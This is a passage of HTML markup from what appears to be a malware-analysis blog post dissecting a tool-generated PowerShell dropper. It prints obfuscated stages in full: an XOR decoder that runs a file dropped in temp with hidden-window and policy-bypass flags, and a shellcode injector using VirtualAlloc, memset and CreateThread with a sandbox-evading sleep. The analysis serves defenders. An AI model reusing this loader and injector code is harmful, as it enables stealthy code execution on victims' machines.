+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7e9009506676-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7e9009506676-1"><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'9 0 7 2 4 8 6 5 8 3 1 0'</span><span class="crayon-o">-</span><span class="crayon-i">RePlace</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">rEPLACe</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'e'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">,</span><span class="crayon-s">'-'</span><span class="crayon-sy">,</span><span class="crayon-s">'b'</span><span class="crayon-sy">,</span><span class="crayon-s">'v'</span><span class="crayon-sy">,</span><span class="crayon-s">'i'</span><span class="crayon-sy">,</span><span class="crayon-s">'r'</span><span class="crayon-sy">,</span><span class="crayon-s">'t'</span><span class="crayon-sy">,</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'s'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">yZs6ssMMnN2l</span><span class="crayon-h"> </span><span class="crayon-cn">27</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'SEt-VariaB'</span><span class="crayon-o">+</span><span class="crayon-s">'l'</span><span class="crayon-o">+</span><span class="crayon-s">'e'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">ymr1vVoTcIP3</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'{1}{0}'</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'E'</span><span class="crayon-sy">,</span><span class="crayon-s">'SeT-VaRiaBL'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">lMRIO47kiset</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'Se'</span><span class="crayon-o">+</span><span class="crayon-s">'t-vA'</span><span class="crayon-o">+</span><span class="crayon-s">'riabLE'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">x6ZzoiDv0Y3X</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'Get-'</span><span class="crayon-o">+</span><span class="crayon-s">'vAR'</span><span class="crayon-o">+</span><span class="crayon-s">'iAbLe'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">yZs6ssMMnN2l</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'vALU'</span><span class="crayon-o">+</span><span class="crayon-s">'e'</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">18</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-st">AS</span><span class="crayon-sy">[</span><span class="crayon-t">chaR</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'tOST'</span><span class="crayon-o">+</span><span class="crayon-s">'R'</span><span class="crayon-o">+</span><span class="crayon-s">'i'</span><span class="crayon-o">+</span><span class="crayon-s">'ng'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">InvoKe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'8 7 5 6 3 0 1 4 0 2 9 7'</span><span class="crayon-o">-</span><span class="crayon-i">rEpLaCE</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">RePlaCE</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'r'</span><span class="crayon-sy">,</span><span class="crayon-s">'b'</span><span class="crayon-sy">,</span><span class="crayon-s">'v'</span><span class="crayon-sy">,</span><span class="crayon-s">'i'</span><span class="crayon-sy">,</span><span class="crayon-s">'t'</span><span class="crayon-sy">,</span><span class="crayon-s">'-'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">,</span><span class="crayon-s">'g'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">ymr1vVoTcIP3</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'3 1 4 0 2'</span><span class="crayon-o">-</span><span class="crayon-i">REplaCE</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">rePLaCE</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'u'</span><span class="crayon-sy">,</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">,</span><span class="crayon-s">'v'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">57</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-st">As</span><span class="crayon-sy">[</span><span class="crayon-t">cHaR</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'TOStr'</span><span class="crayon-o">+</span><span class="crayon-s">'In'</span><span class="crayon-o">+</span><span class="crayon-s">'G'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">iNVOKE</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'GEt-vAriaBlE'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">lMRIO47kiset</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'va'</span><span class="crayon-o">+</span><span class="crayon-s">'Lu'</span><span class="crayon-o">+</span><span class="crayon-s">'e'</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">88</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-st">AS</span><span class="crayon-sy">[</span><span class="crayon-t">CHAr</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'{1}{3}{2}{0}'</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'NG'</span><span class="crayon-sy">,</span><span class="crayon-s">'tOs'</span><span class="crayon-sy">,</span><span class="crayon-s">'i'</span><span class="crayon-sy">,</span><span class="crayon-s">'TR'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">InVokE</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">poWErshell</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">noNiNtERA</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">NOLO</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">NOprOF</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">window </span><span class="crayon-v">HIDdeN</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">eXe </span><span class="crayon-e">BypAss</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'GET-vaRi'</span><span class="crayon-o">+</span><span class="crayon-s">'AbLE'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">x6ZzoiDv0Y3X</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'1 0 3 4 2'</span><span class="crayon-o">-</span><span class="crayon-i">rEpLaCe</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">rEPlaCe</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'v'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">,</span><span class="crayon-s">'u'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'tOsTri'</span><span class="crayon-o">+</span><span class="crayon-s">'n'</span><span class="crayon-o">+</span><span class="crayon-s">'g'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">INvokE</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-t">chaR</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-t">chAr</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'new-o'</span><span class="crayon-o">+</span><span class="crayon-s">'bje'</span><span class="crayon-o">+</span><span class="crayon-s">'c'</span><span class="crayon-o">+</span><span class="crayon-s">'T'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'7 5 0 8 3 5 6 2 1 4 5 7 0'</span><span class="crayon-o">-</span><span class="crayon-i">replAcE</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">rEplAcE</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'t'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">,</span><span class="crayon-s">'c'</span><span class="crayon-sy">,</span><span class="crayon-s">'w'</span><span class="crayon-sy">,</span><span class="crayon-s">'i'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">,</span><span class="crayon-s">'b'</span><span class="crayon-sy">,</span><span class="crayon-s">'n'</span><span class="crayon-sy">,</span><span class="crayon-s">'.'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'10 4 5 7 3 4 9 10 6 0 8 2 7 1'</span><span class="crayon-o">-</span><span class="crayon-i">RePLAcE</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">repLAcE</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'t'</span><span class="crayon-sy">,</span><span class="crayon-s">'g'</span><span class="crayon-sy">,</span><span class="crayon-s">'i'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">,</span><span class="crayon-s">'o'</span><span class="crayon-sy">,</span><span class="crayon-s">'w'</span><span class="crayon-sy">,</span><span class="crayon-s">'s'</span><span class="crayon-sy">,</span><span class="crayon-s">'n'</span><span class="crayon-sy">,</span><span class="crayon-s">'r'</span><span class="crayon-sy">,</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'d'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">InVOke</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">temp</span><span class="crayon-o">+</span><span class="crayon-s">'\A62q1gMHhRWy'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">wlITpDaitdSn</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">}</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-o">-</span><span class="crayon-i">bxOr</span><span class="crayon-s">'cwqslBksSTba7qa7VJqrWOEWo4nQo41P'</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">wlITpDaitdSn</span><span class="crayon-o">++</span><span class="crayon-o">%</span><span class="crayon-cn">32</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">jOIN</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-i">Item</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-i">temp</span><span class="crayon-s">'\A62q1gMHhRWy'</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0023 seconds] -->
+<p>The meat of this script is towards the very end. Here you can see that it loads the file that was written to disk by the executable (“A62q1gMHhRWy”) and then does a binary XOR with the key “cwqslBksSTba7qa7VJqrWOEWo4nQo41P”. Again, this is all randomized, including the XOR key, but seeing the static file name value this deep into the sample was a key indicator that this was likely generated from a tool and not manually crafted at scale.<br />
+Once decoded it results in another PowerShell script that begins like the very first, with a Hex-&gt;ASCII obfuscation that gets invoked.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7ec937668789" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+(-Join(('24706950745a4e78723166354b3d26282761 …</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7ec937668789-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7ec937668789-1"><span class="crayon-sy">(</span><span class="crayon-o">-</span><span class="crayon-v">Join</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span>'<span class="crayon-cn">24706950745a4e78723166354b3d26282761</span><span class="crayon-h"> </span>…</div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0001 seconds] -->
+<p>Finally, it launches a script which does the tried and true shellcode injection technique. The framework for this script can be found in most PowerShell offensive tools, but effectively it calls VirtualAlloc() to create memory for the shellcode to reside, memset() to copy the shellcode in, and then CreateThread() to transfer execution to the shellcode after a long sleep, which is included for sandbox avoidance.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7ed506380613" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+$piPtZNxr1f5K=&amp;('ad'+'d-'+'TyPE') -m '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' -name 'Win32' -ns Win32Functions -pas;[byTE[]]$RDm7s2YDUaBL=0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,
+…&lt;TRUNCATED&gt;…
+0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x1,0xc3,0x29,0xc6,0x75,0xee,0xc3;$lXw9sqCMdGHQ=$piPtZNxr1f5K::('{2}{1}{0}{3}'-f'o','lAll','viRtuA','C').inVokE(0,[Math]::(('2 0 1'-REpLAcE'\w+','{${0}}'-rEPlaCe' ','')-f'a','x','m').INvoke($RDm7s2YDUaBL.(('1 5 2 3 0 4'-RepLaCe'\w+','{${0}}'-ReplAce' ','')-f't','l','n','g','h','e'),0x1000),0x3000,0x40);for($Zxv0oxgiqKpR=0;$Zxv0oxgiqKpR -le ($RDm7s2YDUaBL.('lEn'+'G'+'T'+'h')-1);$Zxv0oxgiqKpR++){[VoID]$piPtZNxr1f5K::(('0 3 0 2 3 1'-RepLAce'\w+','{${0}}'-rEplacE' ','')-f'm','t','s','e').INVOKe([InTptr]($lXw9sqCMdGHQ.ToInt32()+$Zxv0oxgiqKpR),$RDm7s2YDUaBL[$Zxv0oxgiqKpR],1)};$piPtZNxr1f5K::('CrEatETHrE'+'A'+'d').InvoKE(0,0,$lXw9sqCMdGHQ,0,0,0);.('{0}'-f'STarT-slEep') 100000</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7ed506380613-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7ed506380613-2">2</div><div class="crayon-num" data-line="crayon-5f694cd07d7ed506380613-3">3</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7ed506380613-1"><span class="crayon-sy">$</span><span class="crayon-v">piPtZNxr1f5K</span><span class="crayon-o">=&amp;</span><span class="crayon-sy">(</span><span class="crayon-s">'ad'</span><span class="crayon-o">+</span><span class="crayon-s">'d-'</span><span class="crayon-o">+</span><span class="crayon-s">'TyPE'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">m</span><span class="crayon-h"> </span><span class="crayon-s">'[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">name</span><span class="crayon-h"> </span><span class="crayon-s">'Win32'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">ns </span><span class="crayon-v">Win32Functions</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">pas</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">byTE</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">RDm7s2YDUaBL</span><span class="crayon-o">=</span><span class="crayon-cn">0xfc</span><span class="crayon-sy">,</span><span class="crayon-cn">0xe8</span><span class="crayon-sy">,</span><span class="crayon-cn">0x82</span><span class="crayon-sy">,</span><span class="crayon-cn">0x00</span><span class="crayon-sy">,</span><span class="crayon-cn">0x00</span><span class="crayon-sy">,</span><span class="crayon-cn">0x00</span><span class="crayon-sy">,</span><span class="crayon-cn">0x60</span><span class="crayon-sy">,</span><span class="crayon-cn">0x89</span><span class="crayon-sy">,</span><span class="crayon-cn">0xe5</span><span class="crayon-sy">,</span><span class="crayon-cn">0x31</span><span class="crayon-sy">,</span><span class="crayon-cn">0xc0</span><span class="crayon-sy">,</span><span class="crayon-cn">0x64</span><span class="crayon-sy">,</span><span class="crayon-cn">0x8b</span><span class="crayon-sy">,</span><span class="crayon-cn">0x50</span><span class="crayon-sy">,</span><span class="crayon-cn">0x30</span><span class="crayon-sy">,</span><span class="crayon-cn">0x8b</span><span class="crayon-sy">,</span><span class="crayon-cn">0x52</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7ed506380613-2">…<span class="crayon-o">&lt;</span><span class="crayon-v">TRUNCATED</span><span class="crayon-o">&gt;</span>…</div><div class="crayon-line" id="crayon-5f694cd07d7ed506380613-3"><span class="crayon-cn">0x53</span><span class="crayon-sy">,</span><span class="crayon-cn">0x6a</span><span class="crayon-sy">,</span><span class="crayon-cn">0x00</span><span class="crayon-sy">,</span><span class="crayon-cn">0x56</span><span class="crayon-sy">,</span><span class="crayon-cn">0x53</span><span class="crayon-sy">,</span><span class="crayon-cn">0x57</span><span class="crayon-sy">,</span><span class="crayon-cn">0x68</span><span class="crayon-sy">,</span><span class="crayon-cn">0x02</span><span class="crayon-sy">,</span><span class="crayon-cn">0xd9</span><span class="crayon-sy">,</span><span class="crayon-cn">0xc8</span><span class="crayon-sy">,</span><span class="crayon-cn">0x5f</span><span class="crayon-sy">,</span><span class="crayon-cn">0xff</span><span class="crayon-sy">,</span><span class="crayon-cn">0xd5</span><span class="crayon-sy">,</span><span class="crayon-cn">0x1</span><span class="crayon-sy">,</span><span class="crayon-cn">0xc3</span><span class="crayon-sy">,</span><span class="crayon-cn">0x29</span><span class="crayon-sy">,</span><span class="crayon-cn">0xc6</span><span class="crayon-sy">,</span><span class="crayon-cn">0x75</span><span class="crayon-sy">,</span><span class="crayon-cn">0xee</span><span class="crayon-sy">,</span><span class="crayon-cn">0xc3</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">lXw9sqCMdGHQ</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">piPtZNxr1f5K</span><span class="crayon-o">::</span><span class="crayon-sy">(</span><span class="crayon-s">'{2}{1}{0}{3}'</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'o'</span><span class="crayon-sy">,</span><span class="crayon-s">'lAll'</span><span class="crayon-sy">,</span><span class="crayon-s">'viRtuA'</span><span class="crayon-sy">,</span><span class="crayon-s">'C'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">inVokE</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">Math</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'2 0 1'</span><span class="crayon-o">-</span><span class="crayon-i">REpLAcE</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">rEPlaCe</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'x'</span><span class="crayon-sy">,</span><span class="crayon-s">'m'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">INvoke</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RDm7s2YDUaBL</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'1 5 2 3 0 4'</span><span class="crayon-o">-</span><span class="crayon-i">RepLaCe</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">ReplAce</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'t'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">,</span><span class="crayon-s">'n'</span><span class="crayon-sy">,</span><span class="crayon-s">'g'</span><span class="crayon-sy">,</span><span class="crayon-s">'h'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-cn">0x1000</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-cn">0x3000</span><span class="crayon-sy">,</span><span class="crayon-cn">0x40</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">Zxv0oxgiqKpR</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Zxv0oxgiqKpR</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">le</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RDm7s2YDUaBL</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'lEn'</span><span class="crayon-o">+</span><span class="crayon-s">'G'</span><span class="crayon-o">+</span><span class="crayon-s">'T'</span><span class="crayon-o">+</span><span class="crayon-s">'h'</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Zxv0oxgiqKpR</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span 